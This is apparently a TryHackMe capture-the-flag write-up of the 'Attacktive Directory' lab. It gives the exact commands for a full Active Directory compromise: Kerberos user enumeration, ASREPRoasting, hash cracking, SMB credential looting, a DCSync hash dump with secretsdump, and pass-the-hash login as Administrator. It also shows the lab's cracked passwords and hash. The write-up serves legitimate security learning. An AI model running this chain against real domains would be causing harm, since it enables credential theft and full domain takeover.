# Attacktive Directory (SpookySec) — Writeup

## Objective
Full compromise of the `spookysec.local` domain controller (10.65.178.80),
from initial enumeration through Domain Admin and flag retrieval.

## 1. Nmap Scan
```
nmap -sC -sV -p- 10.65.178.80
```
**Notable open ports:** 53 (DNS), 80 (IIS), 88 (Kerberos), 135/139/445
(RPC/SMB), 389/3268 (LDAP), 464 (kpasswd), 3389 (RDP), 5985 (WinRM).

The LDAP output confirmed the domain name (`spookysec.local`) and the
RDP cert/NTLM info confirmed the hostname `AttacktiveDirectory` and
NetBIOS name `THM-AD`. Kerberos (88) being open meant username
enumeration and roasting attacks were immediately viable.

## 2. Username Enumeration with Kerbrute
Using an OSINT-sourced username list:
```
kerbrute userenum -d spookysec.local --dc 10.65.178.80 users.txt
```
**Result:** 16 valid usernames confirmed via Kerberos pre-auth
responses, no lockouts triggered. Two stood out as high-value targets:
`svc-admin` (service account — Kerberoast/ASREPRoast candidate) and
`backup` (name strongly suggests elevated/replication privileges).

## 3. ASREPRoasting with Impacket
```
./GetNPUsers.py spookysec.local/svc-admin -dc-ip 10.65.178.80 -no-pass
```
`svc-admin` had Kerberos pre-authentication disabled, returning an
AS-REP hash (`$krb5asrep$23$...`) without needing any credentials.

## 4. Cracking the Hash with Hashcat
```
hashcat -m 18200 hash.txt pass.txt
```
Using an OSINT-sourced password list, the hash cracked instantly:
```
svc-admin : management2005
```

## 5. SMB Enumeration
```
smbclient -L //10.65.178.80 -U svc-admin
```
Authenticated share listing revealed a non-default `backup` share.
```
smbclient //10.65.178.80/backup -U svc-admin
```
Found and downloaded `backup_credentials.txt`. Contents were base64
encoded:
```
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```
Decoded (via CyberChef Magic):
```
backup@spookysec.local:backup2517860
```

## 6. Domain Privilege Escalation — DCSync
The `backup` account holds Directory Replication Service (DRS)
permissions, allowing it to sync all AD data — including password
hashes — from the DC.
```
./secretsdump.py spookysec.local/backup:backup2517860@10.65.178.80
```
**Result:** Full NTDS.DIT dump — NTLM hashes and Kerberos keys for every
domain account, including:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
```

## 7. Pass-the-Hash as Administrator
Using the Administrator's NTLM hash directly with Evil-WinRM — no
password/cracking needed:
```
evil-winrm -i 10.65.178.80 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```
Successfully authenticated with full Administrator access on the DC.

## Flags
```
TryHackMe{K3rb3r0s_Pr3_4uth}          — C:\Users\svc-admin\Desktop\user.txt.txt
TryHackMe{B4ckM3UpSc0tty!}            — C:\Users\backup\Desktop\PrivEsc.txt
TryHackMe{4ctiveD1rectoryM4st3r}      — C:\Users\Administrator\Desktop\root.txt
```

## Summary
Full domain compromise achieved through a classic AD attack chain:
Kerberos pre-auth enumeration (Kerbrute) → ASREPRoasting a service
account with disabled pre-auth (`svc-admin`) → cracking the resulting
hash offline → using those creds to reach an SMB share with plaintext
(base64-obscured) credentials for the `backup` account → abusing that
account's DCSync/replication rights to dump every hash in the domain →
using the Administrator's NTLM hash directly via Pass-the-Hash to gain
full administrative access on the Domain Controller. No exploit or
memory corruption was needed — every step was a misconfiguration or
credential exposure chained together.

